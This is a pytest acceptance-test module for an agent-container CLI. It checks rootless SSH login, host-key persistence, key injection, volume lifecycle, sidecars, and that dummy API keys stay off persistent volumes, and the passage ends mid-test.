"""Acceptance layer — constitution Principle V (Durable Spec, Disposable Code).

Real-container, end-to-end validation of the rootless SSH-identity behavior:
the load-bearing top of the inverted pyramid. These assert *observable behavior*
(a real client logging in over ssh, a fingerprint surviving a recreate) rather
than the code's internals, so they survive a regenerated implementation.

Marked `acceptance` and EXCLUDED by default (`addopts = -m 'not acceptance'` in
pyproject.toml); run with `pytest -m acceptance bin/tests`. The module skips
entirely without a container runtime + ssh tooling. Unlike scripts/smoke-test.sh
(the git-push acceptance, which needs a real repo), these paths never push, so
they need only DUMMY credentials and run in CI without any secrets.

Codifies the manual verification performed during the SSH-identity work.
"""

from __future__ import annotations

import base64
import contextlib
import hashlib
import json
import os
import re
import shlex
import shutil
import socket
import subprocess
import sys
import tempfile
import textwrap
import time
import types
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import pytest
from conftest import SCRIPT_PATH


def _acc_base() -> Path:
    """A working-dir base that the container runtime can bind-mount from on both
    Linux (any path) AND macOS+Lima (where /tmp and /private/var are NOT shared
    into the VM, but the user's home is). The concatenated authorized_keys state file
    is delivered from here, so it must live somewhere the daemon can read. Override with AGENT_CONTAINER_ACCEPTANCE_TMPDIR."""
    base = Path(
        os.environ.get("AGENT_CONTAINER_ACCEPTANCE_TMPDIR")
        or Path.home() / ".cache" / "agent-container-acceptance"
    )
    base.mkdir(parents=True, exist_ok=True)
    return base


def _detect_runtime() -> str | None:
    override = os.environ.get("AGENT_CONTAINER_RUNTIME")
    if override in ("docker", "podman") and shutil.which(override):
        return override
    for rt in ("docker", "podman"):
        if shutil.which(rt):
            return rt
    return None


RUNTIME = _detect_runtime()
_MISSING = [t for t in ("ssh", "ssh-keygen", "uv") if shutil.which(t) is None]

pytestmark = [
    pytest.mark.acceptance,
    pytest.mark.skipif(RUNTIME is None, reason="no docker/podman runtime on PATH"),
    pytest.mark.skipif(bool(_MISSING), reason=f"missing tools: {_MISSING}"),
]

# Invoke the real CLI exactly as an operator would (single PEP 723 uv script).
AGENT_CONTAINER = ["uv", "run", "--no-project", "--script", str(SCRIPT_PATH)]


# --- low-level helpers -------------------------------------------------------


def _cli_env(state_dir: Path) -> dict[str, str]:
    env = dict(os.environ)
    env["AGENT_CONTAINER_RUNTIME"] = RUNTIME  # deterministic runtime in CI
    env["XDG_STATE_HOME"] = str(state_dir)  # isolate the .port state files
    # Isolate CONFIG_DIR too so the suite never reads the developer's real
    # ~/.config/agent-container (hosts.json) AND so a test can seed a
    # convention-discovered canonical config under it (US3).
    env["XDG_CONFIG_HOME"] = str(state_dir / "xdgconfig")
    # Feature 016: the run-record store is DATA, not state. Without this the suite
    # would write records into the developer's real ~/.local/share/agent-container
    # and — worse — read them back, so a `runs list` assertion could pass on a
    # record left behind by an earlier session instead of the one it just made.
    env["XDG_DATA_HOME"] = str(state_dir / "xdgdata")
    return env


def _config_dir_of(state_dir: Path) -> Path:
    """CONFIG_DIR the CLI resolves under the isolated XDG_CONFIG_HOME (see _cli_env)."""
    return state_dir / "xdgconfig" / "agent-container"


def _pcd(work: Path) -> Path:
    """Feature 011: the project config directory, created on demand."""
    d = work / ".agent-container"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _userconf(acc) -> Path:
    """Feature 011 FR-001f: plaintext credentials are USER-LEVEL only — there is
    deliberately no project-local location for them."""
    d = _config_dir_of(acc.state_dir)
    d.mkdir(parents=True, exist_ok=True)
    return d


def _exec(name: str, argv: list[str]) -> subprocess.CompletedProcess:
    return subprocess.run(
        [RUNTIME, "exec", f"agent-container-{name}", *argv],
        capture_output=True,
        text=True,
    )


def _run_cli(
    argv: list[str],
    state_dir: Path,
    timeout: int = 600,
    cwd: Path | None = None,
    extra_env: dict[str, str] | None = None,
):
    env = _cli_env(state_dir)
    if extra_env:
        env.update(extra_env)
    return subprocess.run(
        argv,
        env=env,
        cwd=str(cwd) if cwd else None,
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,
        timeout=timeout,
    )


def _gen_keypair(path: Path) -> Path:
    subprocess.run(
        ["ssh-keygen", "-q", "-t", "ed25519", "-f", str(path), "-N", ""],
        check=True,
        stdin=subprocess.DEVNULL,
    )
    return path


def _fingerprint(pub: Path) -> str:
    r = subprocess.run(["ssh-keygen", "-lf", str(pub)], capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    return r.stdout.split()[1]  # SHA256:...


def _container_hostkey_fp(name: str) -> str:
    """Fingerprint of the host key the running container is actually using."""
    r = subprocess.run(
        [
            RUNTIME,
            "exec",
            f"agent-container-{name}",
            "ssh-keygen",
            "-lf",
            "/home/dev/.ssh/hostkeys/ssh_host_ed25519_key.pub",
        ],
        capture_output=True,
        text=True,
    )
    assert r.returncode == 0, r.stderr
    return r.stdout.split()[1]


def _container_diag(name: str) -> str:
    """Container status + recent logs — surfaced when sshd fails to come up so a
    CI failure shows WHY (crash, missing host key, sshd exit) instead of a bare
    'not reachable'. Reproducing this locally is hard (the failures are specific
    to the CI runtime), so the diagnostics must travel with the assertion."""
    cname = f"agent-container-{name}"
    chunks = []
    for label, argv in (
        (
            "ps",
            [
                RUNTIME,
                "ps",
                "-a",
                "--filter",
                f"name={cname}",
                "--format",
                "{{.Status}} | {{.Ports}}",
            ],
        ),
        ("logs (tail 80)", [RUNTIME, "logs", "--tail", "80", cname]),
    ):
        r = subprocess.run(argv, capture_output=True, text=True)
        chunks.append(f"--- {label} ---\n{(r.stdout + r.stderr).strip()}")
    return "\n".join(chunks)


def _wait_until(predicate, what: str, timeout: int = 60) -> None:
    """Poll until `predicate` holds, then return; fail NAMING what was awaited.

    A bare `time.sleep` would make every downstream assertion flaky in a way that
    reads as a product defect, and a timeout whose message says only "timed out"
    sends the reader to the wrong place.
    """
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if predicate():
            return
        time.sleep(0.4)
    pytest.fail(f"timed out after {timeout}s waiting for: {what}")


def _runs_store_of(state_dir: Path) -> Path:
    """The durable run store under the isolated XDG_DATA_HOME (see _cli_env).

    Derived from the same constant the harness sets, so a change to the isolation
    scheme breaks this loudly instead of making every trail assertion read as
    "nothing was exported" — the vacuous pass that would hide a broken exporter.
    """
    return state_dir / "xdgdata" / "agent-container" / "runs"


def _record_states(acc) -> list[str]:
    """The `export_state` of every record in the operator's durable store."""
    root = _runs_store_of(acc.state_dir)
    out = []
    for path in sorted(root.glob("*/*/*.json")):
        with contextlib.suppress(OSError, json.JSONDecodeError):
            out.append(str(json.loads(path.read_text()).get("export_state")))
    return out


def _wait_sshd(port: int, timeout: int = 45) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            if s.connect_ex(("127.0.0.1", port)) == 0:
                time.sleep(1)  # sshd bound; give it a beat to accept auth
                return
        time.sleep(1)
    raise AssertionError(f"sshd never became reachable on port {port}")


def _ssh_until_protocol_answer(argv: list[str], timeout: int = 60) -> subprocess.CompletedProcess:
    """Run `ssh` until it gets far enough to give a PROTOCOL answer, not a transport one.

    `pkill -HUP sshd` makes sshd re-exec itself, so for a moment the port is bound
    (a TCP connect succeeds, which is all `_wait_sshd` proves) while the banner
    exchange fails with `kex_exchange_identification: Connection reset by peer`.

    That matters because the caller is asserting a HOST-KEY REFUSAL. A transport
    reset is also a non-zero exit, so a test that only checked the exit code would
    pass here while proving nothing about the pin — which is exactly the failure
    mode Feature 018 exists to prevent, reproduced in its own test. So retry past
    the restart and let the caller assert on the reason.
    """
    deadline = time.monotonic() + timeout
    r = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
    while time.monotonic() < deadline and (
        "kex_exchange_identification" in r.stderr or "Connection reset" in r.stderr
    ):
        time.sleep(1)
        r = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
    return r


def _ssh(port: int, key: Path, command: str, *, tty: bool = False) -> subprocess.CompletedProcess:
    """Run `command` over SSH as dev.

    `tty=True` forces a pty with `-tt`, which is required whenever the assertion
    is about WIDTH-DEPENDENT rendering: without one the CLI measures a pipe, which
    is deliberately not narrow, and the test would exercise the wide form while
    claiming to check the narrow one.
    """
    return subprocess.run(
        [
            "ssh",
            *(["-tt"] if tty else []),
            "-i",
            str(key),
            "-p",
            str(port),
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "UserKnownHostsFile=/dev/null",
            "-o",
            "BatchMode=yes",
            "-o",
            "ConnectTimeout=10",
            "dev@localhost",
            command,
        ],
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,
        timeout=30,
    )


# --- fixtures ----------------------------------------------------------------


@pytest.fixture(scope="session")
def _image(tmp_path_factory) -> str:
    """Build the image once for the whole acceptance session."""
    state = tmp_path_factory.mktemp("acc-build-state")
    r = _run_cli([*AGENT_CONTAINER, "build"], state, timeout=3600)
    if r.returncode != 0:
        pytest.fail(f"image build failed:\n{r.stderr[-3000:]}")
    return "localhost/agent-container:latest"


CONTROL_PLANE_IMAGE = "localhost/agent-container-control-plane:latest"


@pytest.fixture(scope="session")
def _control_plane_image(_image) -> str:
    """The SECOND image (Feature 017 FR-015a).

    Depends on `_image` rather than building separately: `build` produces both, so
    a second invocation would rebuild the agent image for nothing. Asserted to
    EXIST rather than assumed — `build` skips it when it cannot resolve a version
    (the image pins the CLI it installs), and a missing image would otherwise
    surface as every 017 acceptance failing on `up` instead of on the reason.
    """
    r = subprocess.run(
        [RUNTIME, "image", "inspect", CONTROL_PLANE_IMAGE],
        capture_output=True,
        text=True,
    )
    if r.returncode != 0:
        pytest.fail(
            f"{CONTROL_PLANE_IMAGE} was not built. `build` refuses it when the CLI "
            f"version is unresolvable, because that image PINS the CLI it installs. "
            f"Run from a checkout with a resolvable version."
        )
    return CONTROL_PLANE_IMAGE


@pytest.fixture
def acc(_image):
    """Container lifecycle harness: .up()/.down()/.keys() drive the real CLI
    against real containers, and every container started is torn down + purged
    at the end of the test (even on failure). Working files live under a
    runtime-mountable base (see _acc_base) so bind mounts work under Lima too."""
    work = Path(tempfile.mkdtemp(dir=_acc_base()))
    state_dir = work / "state"
    state_dir.mkdir()
    started: list[str] = []

    def up(
        name,
        *,
        authorized_key=None,
        env_extra=None,
        known_hosts=None,
        mode=None,
        agent=None,
        role=None,
        task=None,
        workspace=None,
        workspace_dir=None,
        mount=None,
        repo=None,
        foreground=False,
        wait=True,
    ):  # noqa: E501
        """Drive the real `up`. Returns the published port when `wait` (interactive:
        wait for sshd); with wait=False returns the CompletedProcess (headless — no
        sshd to wait for). Feature 004 flags are forwarded verbatim."""
        env_file = work / f"{name}.env"
        lines = ["GH_TOKEN=x", "GIT_USER_NAME=Test", "GIT_USER_EMAIL=t@example.com"]
        lines += list(env_extra or [])
        env_file.write_text("\n".join(lines) + "\n")
        argv = [*AGENT_CONTAINER, "up", name, "--env-file", str(env_file)]
        for ak in authorized_key or []:
            argv += ["--authorized-key", str(ak)]
        if known_hosts is not None:
            argv += ["--known-hosts", str(known_hosts)]
        if mode is not None:
            argv += ["--mode", mode]
        if agent is not None:
            argv += ["--agent", agent]
        if role is not None:
            argv += ["--role", role]
        if task is not None:
            argv += ["--task", task]
        if workspace is not None:
            argv += ["--workspace", workspace]
        if workspace_dir is not None:
            argv += ["--workspace-dir", str(workspace_dir)]
        for m in mount or []:
            # Repeatable, as the flag is. Needed for a run whose stand-in agent
            # cannot live on the workspace: an `ephemeral` workspace is a fresh
            # container layer, so nothing on the host can seed it (T032).
            argv += ["--mount", str(m)]
        if repo is not None:
            argv += ["--repo", repo]
        if foreground:
            argv += ["--foreground"]
        started.append(name)  # register for teardown even if `up` returns non-zero
        r = _run_cli(argv, state_dir)
        if not wait:
            return r
        assert r.returncode == 0, f"up {name} failed:\n{r.stderr}"
        # Feature 001: state is namespaced per host; `up` with no --host uses the
        # implicit 'local' host, so the port state lands under local/.
        port = int((state_dir / "agent-container" / "local" / f"{name}.port").read_text().strip())
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None
        return port

    def up_raw(name, **kw):
        """`up`, returning the CompletedProcess.

        `up` asserts success and returns a port, discarding stdout — which is
        precisely where the one-shot passphrase is. A separate entry point rather
        than a flag on `up`, so no existing caller changes behaviour.
        """
        r = up(name, wait=False, **kw)
        assert r.returncode == 0, f"up {name} failed:\n{r.stderr}"
        port_file = state_dir / "agent-container" / "local" / f"{name}.port"
        if port_file.is_file():
            _wait_sshd(int(port_file.read_text().strip()))
        return r

    def down(name, *, purge=False):
        argv = [*AGENT_CONTAINER, "down", name, *(["--purge"] if purge else []), "-y"]
        r = _run_cli(argv, state_dir)
        assert r.returncode == 0, f"down {name} failed:\n{r.stderr}"

    def keys(name, *, authorized_key=None):
        argv = [*AGENT_CONTAINER, "keys", name]
        for ak in authorized_key or []:
            argv += ["--authorized-key", str(ak)]
        r = _run_cli(argv, state_dir)
        assert r.returncode == 0, f"keys {name} failed:\n{r.stderr}"

    def volumes_of(name) -> list[str]:
        out = subprocess.run(
            [RUNTIME, "volume", "ls", "--format", "{{.Name}}"],
            capture_output=True,
            text=True,
        ).stdout.splitlines()
        return [v for v in out if v.startswith(f"agent-container-{name}-")]

    def cli(argv, *, cwd=None, extra_env=None, timeout=600):
        """Drive an arbitrary CLI subcommand against the fixture's isolated state
        (used by the declarative apply/status/destroy acceptance)."""
        return _run_cli(
            [*AGENT_CONTAINER, *argv], state_dir, timeout=timeout, cwd=cwd, extra_env=extra_env
        )

    yield types.SimpleNamespace(
        up=up,
        down=down,
        keys=keys,
        volumes_of=volumes_of,
        cli=cli,
        register=started.append,  # ensure a declaratively-applied container is torn down
        tmp=work,
        work=work,
        state_dir=state_dir,
        up_raw=up_raw,
    )

    for name in dict.fromkeys(started):  # dedupe, preserve order
        _run_cli([*AGENT_CONTAINER, "down", name, "--purge", "-y"], state_dir)
    shutil.rmtree(work, ignore_errors=True)


_PASSPHRASE_BEGIN = "AGENT_CONTAINER_CONTROL_PLANE_PASSPHRASE_BEGIN"
_PASSPHRASE_END = "AGENT_CONTAINER_CONTROL_PLANE_PASSPHRASE_END"


def _extract_passphrase(text: str) -> str | None:
    """The printed passphrase, or None.

    Two shapes are accepted because two producers exist: the entrypoint's raw
    sentinel block (visible in container logs) and the CLI's operator-facing
    banner. Matching only one would make the gate pass by finding nothing on the
    path it did not know about — the vacuous-pass failure this suite exists to
    prevent, applied to the feature's load-bearing absence.
    """
    lines = text.splitlines()
    if _PASSPHRASE_BEGIN in lines:
        i = lines.index(_PASSPHRASE_BEGIN)
        if i + 1 < len(lines) and lines[i + 1] != _PASSPHRASE_END:
            return lines[i + 1].strip() or None
    for i, ln in enumerate(lines):
        if "copy it now, it is shown ONCE" in ln and i + 1 < len(lines):
            candidate = lines[i + 1].strip()
            if candidate and not candidate.startswith("==="):
                return candidate
    return None


# --- acceptance tests --------------------------------------------------------


def test_rootless_pubkey_login_as_dev(acc):
    """An operator can ssh in with an injected pubkey, landing as the non-root
    dev user — the whole point of the rootless SSH design."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("acclogin", authorized_key=[laptop.with_suffix(".pub")])
    r = _ssh(port, laptop, "whoami; id -u")
    assert r.returncode == 0, r.stderr
    assert r.stdout.split() == ["dev", "1000"]


def test_identity_persists_across_recreate(acc):
    """The container's OWN host key and authorized_keys survive down/up: the
    fingerprint is stable (no known_hosts churn) and login still works.

    This test used to inject a private host key to prove stability. Feature 018
    removed that channel, and the property is now tested where it actually lives —
    the key the CONTAINER generated on its persisted volume. That is a better test:
    it proves the thing operators rely on rather than the thing the tool used to
    supply.
    """
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("accpersist", authorized_key=[laptop.with_suffix(".pub")])
    generated_fp = _container_hostkey_fp("accpersist")
    assert generated_fp  # the container made one for itself
    assert _ssh(port, laptop, "whoami").stdout.strip() == "dev"

    acc.down("accpersist")  # keep volumes
    port2 = acc.up("accpersist")  # recreate
    assert _container_hostkey_fp("accpersist") == generated_fp  # stable
    assert _ssh(port2, laptop, "whoami").stdout.strip() == "dev"  # authkeys kept


def test_live_key_injection_without_recreate(acc):
    """`keys` injects a PUBLIC key into a RUNNING container and reloads sshd: the new
    pubkey works with no recreate, and the container's host identity is UNTOUCHED.

    Feature 018 removed this command's host-key arm. The surviving half is the half
    that was never an exposure, and the host-key assertion inverts: injecting keys
    must not be able to change what the container is.
    """
    port = acc.up("acclive")
    before = _container_hostkey_fp("acclive")

    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.keys("acclive", authorized_key=[laptop.with_suffix(".pub")])

    assert _container_hostkey_fp("acclive") == before  # identity is not injectable
    assert _ssh(port, laptop, "whoami").stdout.strip() == "dev"

    # And the removed flag refuses, naming the reason (FR-002).
    r = acc.cli(["keys", "acclive", "--host-key", str(laptop)])
    assert r.returncode != 0
    assert "captures the PUBLIC key" in r.stderr


def test_env_file_injection(acc):
    """SSH_AUTHORIZED_KEYS (public) is installed at boot; SSH_HOST_ED25519_KEY_B64
    is INERT (Feature 018).

    The second assertion inverts rather than disappearing: this channel put a base64
    private key in an env file, and a removal with no test behind it is a removal
    nobody notices being undone.
    """
    laptop = _gen_keypair(acc.tmp / "laptop")
    hostkey = _gen_keypair(acc.tmp / "hostkey")
    b64 = base64.b64encode(hostkey.read_bytes()).decode()
    pub = laptop.with_suffix(".pub").read_text().strip()

    port = acc.up(
        "accenv",
        env_extra=[
            f"SSH_AUTHORIZED_KEYS={pub}",
            f"SSH_HOST_ED25519_KEY_B64={b64}",
        ],
    )
    assert _ssh(port, laptop, "whoami").stdout.strip() == "dev"  # public key works
    assert _container_hostkey_fp("accenv") != _fingerprint(hostkey.with_suffix(".pub"))


def test_purge_removes_all_ten_volumes(acc):
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up("accpurge", authorized_key=[laptop.with_suffix(".pub")])
    assert len(acc.volumes_of("accpurge")) == 10  # Feature 010: 7 -> 9; 016: -> 10 (runs)
    acc.down("accpurge", purge=True)
    assert acc.volumes_of("accpurge") == []


def test_distinct_containers_get_distinct_identities(acc):
    """Per-container identity (constitution Principle IV): two auto-generated
    containers have different host keys."""
    acc.up("accdist1")
    acc.up("accdist2")
    assert _container_hostkey_fp("accdist1") != _container_hostkey_fp("accdist2")


def _state_of(name: str) -> str:
    """'running' / 'exited' / '' (absent) for agent-container-<name> on the local daemon."""
    cname = f"agent-container-{name}"
    return subprocess.run(
        [RUNTIME, "ps", "-a", "--filter", f"name=^{cname}$", "--format", "{{.State}}"],
        capture_output=True,
        text=True,
    ).stdout.strip()


def _wait_state(name: str, want: str, timeout: int = 25) -> None:
    """Poll until agent-container-<name> reaches `want` — docker states are
    eventually-consistent (a just-recreated container flaps through 'restarting'
    before settling to 'running'), so assert on the settled state, not an instant."""
    deadline = time.time() + timeout
    last = _state_of(name)
    while time.time() < deadline:
        if last == want:
            return
        time.sleep(0.5)
        last = _state_of(name)
    raise AssertionError(f"{name}: state {last!r} != {want!r} after {timeout}s")


def test_lifecycle_stop_start_dispose_redeploy_wipe(acc):
    """US2 end-to-end (FR-006/007/008/009/017, SC-003): the three persistence
    levels + concurrency, against REAL containers."""
    import fcntl

    state = acc.tmp / "state"

    def cli(*args, timeout=600):
        return _run_cli([*AGENT_CONTAINER, *args], state, timeout=timeout)

    port = acc.up("acclc")
    fp1 = _container_hostkey_fp("acclc")  # host key persisted on the ~/.ssh volume

    # pause / reclaim (FR-006): stop retains, start resumes without recreation
    assert cli("stop", "acclc").returncode == 0
    _wait_state("acclc", "exited")
    assert cli("start", "acclc").returncode == 0
    _wait_sshd(port)
    _wait_state("acclc", "running")

    # SC-003 / FR-007: dispose then recreate restores prior config from volumes
    acc.down("acclc")  # dispose — container gone, volumes kept
    _wait_state("acclc", "")
    acc.up("acclc")
    assert _container_hostkey_fp("acclc") == fp1  # same host key => volume restored

    # redeploy (FR-008): rebuild + recreate, volumes preserved. Pass the same
    # env file the acc harness used for `up` (redeploy re-resolves inputs).
    assert cli("redeploy", "acclc", "--env-file", str(acc.tmp / "acclc.env")).returncode == 0
    _wait_sshd(port)
    _wait_state("acclc", "running")
    assert _container_hostkey_fp("acclc") == fp1  # volumes intact through the recreate

    # FR-017: a concurrent lifecycle op while the lock is held is refused
    lock = state / "agent-container" / "local" / "acclc.lock"
    lock.parent.mkdir(parents=True, exist_ok=True)
    with lock.open("w") as lf:
        fcntl.flock(lf.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
        r = cli("stop", "acclc", timeout=60)
        assert r.returncode != 0 and "another lifecycle operation" in r.stderr, r.stderr

    # wipe (FR-009): container + volumes + built image gone (confirmed via -y)
    assert acc.volumes_of("acclc")  # had its seven volumes
    assert cli("wipe", "acclc", "-y").returncode == 0
    _wait_state("acclc", "")  # container gone
    assert acc.volumes_of("acclc") == []  # volumes wiped


def test_list_reconcile_unreachable_host_renders_without_hanging(acc, tmp_path):
    """US3 / SC-004 at the real CLI: `list` reconciles live — a registered host
    with a dead context renders 'unreachable' (never 'Up', never dropped) and does
    NOT hang the listing; `--local` skips the probe entirely."""
    acc.up("acclist")  # a real running container on the local host
    config = tmp_path / "config" / "agent-container"
    config.mkdir(parents=True)
    driver = "podman" if "podman" in RUNTIME else "docker"
    reg = {
        "version": 1,
        "default": None,
        "hosts": {
            "dead": {
                "driver": driver,
                "context": "agent-container-nonexistent-xyz",  # no such context -> ps fails fast
                "address": "203.0.113.201",  # non-local -> reconciled
                "provisioning": None,
                "created_by_tool": False,
            }
        },
    }
    (config / "hosts.json").write_text(json.dumps(reg))

    def run_list(*extra):
        env = _cli_env(acc.tmp / "state")
        env["XDG_CONFIG_HOME"] = str(tmp_path / "config")
        env.pop("HCLOUD_TOKEN", None)
        return subprocess.run(
            [*AGENT_CONTAINER, "list", "--json", *extra],
            env=env,
            capture_output=True,
            text=True,
            timeout=45,
        )

    t0 = time.time()
    r = run_list()
    assert r.returncode == 0, r.stderr
    assert time.time() - t0 < 30, "list hung on the unreachable host"
    # Feature 009: --json payloads are wrapped in a versioned envelope.
    rows = json.loads(r.stdout)["data"]["containers"]
    dead = [x for x in rows if x["host"] == "dead"]
    assert dead and all(x["status"] == "unreachable" for x in dead)  # never 'Up', never dropped
    assert any(x["name"] == "agent-container-acclist" for x in rows)  # local still listed

    rows_local = json.loads(run_list("--local").stdout)["data"]["containers"]
    assert not any(x["status"] == "unreachable" for x in rows_local)  # --local never probes


def _project_containers(name: str) -> list[str]:
    """Every container in the compose project for <name> (agent + any sidecars),
    matched by the deterministic name prefix so the assertion is independent of
    the runtime's compose label scheme (docker vs podman)."""
    prefix = f"agent-container-{name}"
    out = subprocess.run(
        [RUNTIME, "ps", "-a", "--format", "{{.Names}}"],
        capture_output=True,
        text=True,
    ).stdout.split()
    return sorted(c for c in out if c == prefix or c.startswith((prefix + "-", prefix + "_")))


def _container_state(cname: str) -> str:
    return subprocess.run(
        [RUNTIME, "ps", "-a", "--filter", f"name=^{cname}$", "--format", "{{.State}}"],
        capture_output=True,
        text=True,
    ).stdout.strip()


def _wait_container_state(cname: str, want: str, timeout: int = 25) -> None:
    deadline = time.time() + timeout
    last = _container_state(cname)
    while time.time() < deadline:
        if last == want:
            return
        time.sleep(0.5)
        last = _container_state(cname)
    raise AssertionError(f"{cname}: state {last!r} != {want!r} after {timeout}s")


# A sidecar override that reuses the already-built local image (no registry pull)
# and overrides the entrypoint to a plain long-running command (the agent image's
# real entrypoint requires env — the helper just needs to exist on the network).
_SIDECAR_YAML = (
    "services:\n"
    "  cache:\n"
    "    image: localhost/agent-container:latest\n"
    "    pull_policy: never\n"
    '    entrypoint: ["sleep", "infinity"]\n'
    '    restart: "no"\n'
)


def test_sidecar_shares_deployment_lifecycle(acc, _image):
    """US4 (FR-004) against REAL containers: a helper declared in the sidecar
    override joins the deployment's compose project and shares its lifecycle —
    up/stop/start/wipe act on the agent + helper as ONE unit (no orphaned helper),
    and the agent reaches the helper by its compose service name."""
    name = "accside"
    work = acc.tmp
    state = work / "state"
    env_file = work / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n")
    (_pcd(work) / f"{name}.services.yaml").write_text(_SIDECAR_YAML)

    def cli(*args, timeout=600):
        # cwd=work so the project-local override is discovered (mirrors real use).
        return subprocess.run(
            [*AGENT_CONTAINER, *args],
            env=_cli_env(state),
            cwd=str(work),
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=timeout,
        )

    try:
        r = cli("up", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        conts = _project_containers(name)
        assert len(conts) == 2, f"expected agent + helper, got {conts}"
        assert f"agent-container-{name}" in conts
        helper = next(c for c in conts if c != f"agent-container-{name}")
        assert "cache" in helper

        # the agent resolves the helper by compose service name (shared network)
        g = subprocess.run(
            [RUNTIME, "exec", f"agent-container-{name}", "getent", "hosts", "cache"],
            capture_output=True,
            text=True,
        )
        assert g.returncode == 0 and g.stdout.strip(), f"agent can't resolve 'cache': {g.stderr}"

        # stop/start move the whole unit — no orphaned helper
        assert cli("stop", name).returncode == 0, "stop failed"
        _wait_container_state(f"agent-container-{name}", "exited")
        _wait_container_state(helper, "exited")
        assert cli("start", name).returncode == 0, "start failed"
        _wait_container_state(f"agent-container-{name}", "running")
        _wait_container_state(helper, "running")

        # wipe removes the unit entirely — agent AND helper gone
        assert cli("wipe", name, "-y").returncode == 0, "wipe failed"
        _wait_container_state(f"agent-container-{name}", "")
        assert _project_containers(name) == [], "wipe left an orphaned helper"
    finally:
        cli("wipe", name, "-y", timeout=120)


def test_the_agent_key_is_generated_in_the_container_and_distinct(acc):
    """Feature 019 (S2/S4, FR-001/FR-003) — the successor to 003's push-key test,
    which asserted the exact arrangement this feature deleted.

    003 proved an INJECTED outbound key was ephemeral, off-volume, and wired through
    `core.sshCommand`. 019 inverts all three: the container makes the key itself, it
    lives ON the persisted volume so a recreate does not invalidate the operator's
    registration, and NOTHING wires it — the conventional path is the whole mechanism.
    What survives unchanged is SC-008: it is a different credential from the inbound
    host key, so compromising one does not hand over the other.
    """
    kh = acc.tmp / "known_hosts"
    kh.write_text("github.com ssh-ed25519 AAAAKH\n")
    acc.up("accpush", known_hosts=kh)

    def _x(*cmd):
        return subprocess.run(
            [RUNTIME, "exec", "agent-container-accpush", *cmd], capture_output=True, text=True
        )

    key = "/home/dev/.ssh/id_ed25519"
    assert _x("test", "-f", key).returncode == 0, "the container generated no key"
    assert _x("stat", "-c", "%a", key).stdout.strip() == "600"
    # NOTHING wires it. An empty core.sshCommand is the evidence that the removal was
    # a deletion and not a rewiring — with a value here, every other assertion could
    # pass while the conventional path went unused.
    assert _x("git", "config", "--global", "--get", "core.sshCommand").stdout.strip() == ""
    # ...and the removed injection path is not merely unused, it is absent.
    assert _x("test", "-e", "/home/dev/.ssh/push_ed25519_key").returncode != 0
    # SC-008: distinct from the inbound host key.
    agent_fp = _x("ssh-keygen", "-lf", key).stdout.split()[1]
    host_fp = _x(
        "ssh-keygen", "-lf", "/home/dev/.ssh/hostkeys/ssh_host_ed25519_key"
    ).stdout.split()[1]
    assert agent_fp != host_fp


def test_apikey_injection_ephemeral_and_off_volume(acc, _image):
    """US2 (FR-006/FR-012 / SC-003/SC-004, H1) against a REAL container: a
    convention-discovered provider key FILE is delivered EPHEMERALLY to the
    injected /run path and is NEVER copied onto the -claude/-codex/-pi volumes;
    Codex and pi have their home dirs redirected to an ephemeral location. (A real
    backend-reaching call, SC-002, is the opt-in tokened extension, not run here.)"""
    name = "accapi"
    work = acc.tmp
    state = work / "state"
    env_file = work / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n")
    # Project-local convention files (discovered relative to the CLI's cwd).
    ant_val = "sk-ant-ACCEPTANCE-SECRET"
    oai_val = "sk-oai-ACCEPTANCE-SECRET"
    (_userconf(acc) / f"{name}.anthropic.key").write_text(ant_val + "\n")
    (_userconf(acc) / f"{name}.openai.key").write_text(oai_val + "\n")

    def cli(*args, timeout=600):
        return subprocess.run(
            [*AGENT_CONTAINER, *args],
            env=_cli_env(state),
            cwd=str(work),  # so the project-local key files are discovered
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=timeout,
        )

    def _exec(*cmd):
        return subprocess.run(
            [RUNTIME, "exec", f"agent-container-{name}", *cmd], capture_output=True, text=True
        )

    try:
        r = cli("up", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        port = int((state / "agent-container" / "local" / f"{name}.port").read_text().strip())
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None

        # The injected keys are delivered to the EPHEMERAL /run path (a compose config).
        assert _exec("test", "-f", "/run/agent-container/apikeys/anthropic").returncode == 0
        assert _exec("test", "-f", "/run/agent-container/apikeys/openai").returncode == 0

        # H1/FR-012/SC-004: the key VALUES are NEVER written onto a per-agent volume.
        for vol in ("/home/dev/.claude", "/home/dev/.codex", "/home/dev/.pi"):
            g = _exec("grep", "-rF", ant_val, vol)
            assert g.returncode != 0, f"anthropic key leaked onto {vol}:\n{g.stdout}"
            g = _exec("grep", "-rF", oai_val, vol)
            assert g.returncode != 0, f"openai key leaked onto {vol}:\n{g.stdout}"

        # Claude apiKeyHelper wired: settings.json references a helper that cats the
        # EPHEMERAL injected path (the command, not the secret, lives on the volume).
        s = _exec("cat", "/home/dev/.claude/settings.json")
        assert s.returncode == 0 and "apiKeyHelper" in s.stdout, s.stdout

        # Codex + pi: their homes are redirected to an ephemeral dir (off the volume).
        assert (
